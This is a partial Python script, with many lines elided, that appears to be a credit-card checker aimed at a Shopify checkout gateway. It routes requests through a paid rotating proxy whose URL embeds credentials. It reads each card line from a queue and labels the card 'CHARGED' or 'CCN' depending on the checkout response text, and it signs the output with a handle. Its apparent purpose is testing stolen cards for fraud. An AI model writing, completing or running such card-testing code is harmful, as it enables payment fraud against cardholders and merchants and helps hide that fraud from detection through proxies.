...
def process_lines(queue, bot_number):
    while True:
        ...
        proxy_url = f"http://rp.proxyscrape.com:6060:87sngg2osfnfbc1:ee2t1pmfauyy93f"
        proxy = {
        "http": proxy_url,
        "https": proxy_url,
}       
...
# Use re.search to find the match
    ...
    "Accept-Encoding": "gzip, deflate",
        ...
        if any(keyword in response_final.text for keyword in ["Thank you for your purchase!", "Your order is confirmed", "Thank you"]):
          response_text = f'''     \033[92mCHARGED
     ➤ CC:  {line}
     ➤ Response:  Charged ✅ BY  @iakurdo
     ➤ Gate : Shopify gateway '''
         ...
         response_text = f'''     \033[92mCCN 
     ➤ CC:  {line}
     ➤ Response: Card security code is incorrect ✅ BY  @iakurdo
     ➤ Gate : Shopify gateway '''
